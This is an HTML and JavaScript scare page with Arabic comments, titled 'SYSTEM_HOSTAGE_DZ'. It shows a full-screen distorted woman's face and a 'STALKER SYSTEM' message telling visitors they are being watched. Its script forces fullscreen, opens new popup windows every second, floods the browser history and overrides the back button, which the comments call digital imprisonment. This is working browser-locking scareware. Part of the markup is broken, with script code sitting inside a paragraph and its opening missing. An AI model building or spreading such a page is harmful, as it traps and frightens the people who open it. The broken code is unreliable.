<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM_HOSTAGE_DZ ☠️</title>
    <style>
        /* إعدادات الشاشة الكاملة والخوف سواسوة */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
        
        /* 1. تكبير صورة المرأة على كامل الشاشة سواسوة (Covered & Stalking) */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; 
            width: 105vw; height: 105vh; /* درناها أكبر من الشاشة سواسوة باش نغطو الجوانب */
            object-fit: cover; 
            z-index: 1; 
            filter: contrast(180%) brightness(50%) sepia(30%);
            /* أنيميشن حركة "التربص" البشرية سواسوة */
            animation: stalkingGaze 6s infinite ease-in-out;
        }

        @keyframes stalkingGaze {
            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%) rotate(0deg); }
            25% { transform: scale(1.03) translate(0%, 0%) rotate(1deg); }
            50% { transform: scale(1.06) translate(-5%, -5%) rotate(-1deg); }
            75% { transform: scale(1.02) translate(-2.5%, -1%); }
        }

        /* واجهة الـ Deep Web للرسائل والمدخلات سواسوة */
        #deepWebOverlay { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
            background: rgba(0,0,0,0.8); padding: 30px; border: 1px solid #900; display: none; width: 90%; 
            box-shadow: 0 0 100px #f00;
        }

        .blink-red { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.5; } }
        
        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 10px; width: 80%; text-align: center; font-size: 16px; outline: none; }
    </style>
</head>
<body onclick="launchNightmare()">

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="deepWebOverlay">
        <h1 class="blink-red">STALKER SYSTEM</h1>
        <p style="font-size: 14px; color: #fff; font-weight: bold;">
            لقد دخلت نطاقنا المحرم.. نحن نراقبك الآن سواسوة.<br>

            document.getElementById('deepWebOverlay').style.display = 'block';
            
            // 3. منع الخروج بالكامل سواسوة ( الحبس الرقمي )
            document.documentElement.requestFullscreen();
            setInterval(() => {
                // فتح نوافذ جديدة لتبليك زر الرجوع سواسوة
                window.open(window.location.href, '_blank', 'width=10,height=10');
                // تملية الـ history باش ما يرجعش سواسوة
                history.pushState(null, null, window.location.href);
            }, 1000); // كل ثانية تتبلك الشاشة سواسوة

            }
        }

        // منع الخروج من الـ Overlay سواسوة
        window.onpopstate = function() { history.go(1); };
    </script>
</body>
</html>
